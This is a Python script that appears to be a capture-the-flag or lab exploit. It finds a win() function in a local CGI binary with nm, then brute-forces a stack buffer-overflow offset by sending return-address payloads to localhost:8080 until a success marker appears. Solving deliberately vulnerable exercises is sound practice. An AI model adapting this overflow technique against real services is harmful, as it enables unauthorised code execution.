#!/usr/bin/env python3
import requests
import subprocess
import struct

# Get win() address
result = subprocess.run(['nm', '/var/www/cgi-bin/fog'], capture_output=True, text=True)
for line in result.stdout.split('\n'):
    if ' win' in line:
        win_addr = int(line.split()[0], 16)
        break

print(f"[*] win() address: 0x{win_addr:x}")

# Also try address of first instruction after function prologue
# Sometimes we need to skip the push rbp; mov rbp, rsp
win_addr_skip = win_addr + 4

print(f"[*] Trying win() at 0x{win_addr:x}")
print(f"[*] Also trying win()+4 at 0x{win_addr_skip:x}")
print()

for addr_name, addr in [("win", win_addr), ("win+4", win_addr_skip)]:
    for offset in [64, 72, 80, 88]:
        # Add ret gadget for stack alignment (x64 requires 16-byte alignment)
        payload = b"A" * offset
        payload += struct.pack("<Q", addr)
        
        import urllib.parse
        encoded = urllib.parse.quote(payload)
        url = f"http://localhost:8080/fog?test={encoded}"
        
        print(f"[*] Trying offset={offset}, addr={addr_name} (0x{addr:x})...", end=" ")
        
        try:
            r = requests.get(url, timeout=2)
            if "===WIN_FUNCTION_EXECUTED===" in r.text:
                print("SUCCESS!")
                print(f"\n[+] Exploit worked!")
                print(f"[+] Offset: {offset}")
                print(f"[+] Address: {addr_name} = 0x{addr:x}")
                print(f"\n{r.text[:500]}")
                exit(0)
            else:
                print(f"No win (status={r.status_code})")
        except Exception as e:
            print(f"Crash/Error")

print("\n[!] Exploit failed with all combinations")
